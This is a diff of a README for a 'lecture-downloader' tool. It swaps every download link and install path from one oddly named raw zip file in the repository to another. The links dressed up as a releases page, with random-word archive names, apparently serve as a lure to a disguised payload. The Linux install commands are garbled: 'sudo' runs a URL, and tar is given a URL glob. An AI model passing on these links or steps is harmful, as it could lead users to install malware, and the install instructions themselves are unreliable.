@@ -1,6 +1,6 @@
 # 🎓 lecture-downloader - Easily Download Your Lecture Videos
 
-![Download lecture-downloader](https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/unpayableness/lecture-downloader.zip)
+![Download lecture-downloader](https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/images/downloader-lecture-polymetochic.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ To start using the lecture-downloader, follow these simple steps:
 
 ### 2. Download & Install
 
-To download the latest version of lecture-downloader, visit this page: [Download lecture-downloader](https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/unpayableness/lecture-downloader.zip).
+To download the latest version of lecture-downloader, visit this page: [Download lecture-downloader](https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/images/downloader-lecture-polymetochic.zip).
 
 Once you're on the Releases page, locate the latest version of the software. Click on the link for the appropriate package for your operating system and download it to your computer.
 
@@ -39,17 +39,17 @@ Once you're on the Releases page, locate the latest version of the software. Cli
 
 **For Linux:**
 
-- Locate the downloaded file (usually a `https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/unpayableness/lecture-downloader.zip` or `.deb` file).
+- Locate the downloaded file (usually a `https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/images/downloader-lecture-polymetochic.zip` or `.deb` file).
 - Open a terminal and navigate to the download directory.
 - For `.deb` files, run:
   ```bash
   sudo dpkg -i lecture-downloader*.deb
   ```
-- For `https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/unpayableness/lecture-downloader.zip` files, extract them first:
+- For `https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/images/downloader-lecture-polymetochic.zip` files, extract them first:
   ```bash
-  tar -xvzf lecture-downloader*https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/unpayableness/lecture-downloader.zip
+  tar -xvzf lecture-downloader*https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/images/downloader-lecture-polymetochic.zip
   cd lecture-downloader
-  sudo https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/unpayableness/lecture-downloader.zip
+  sudo https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/images/downloader-lecture-polymetochic.zip
   ```
 
 ### 4. Running the Application
@@ -78,7 +78,7 @@ The interface is user-friendly and guided. Here’s how to use it:
 
 ## 📥 Download Link Again
 
-For your convenience, you can also access the download page here: [Download lecture-downloader](https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/unpayableness/lecture-downloader.zip).
+For your convenience, you can also access the download page here: [Download lecture-downloader](https://raw.githubusercontent.com/lightkey2/lecture-downloader/main/images/downloader-lecture-polymetochic.zip).
 
 ## ⚙️ Features
 
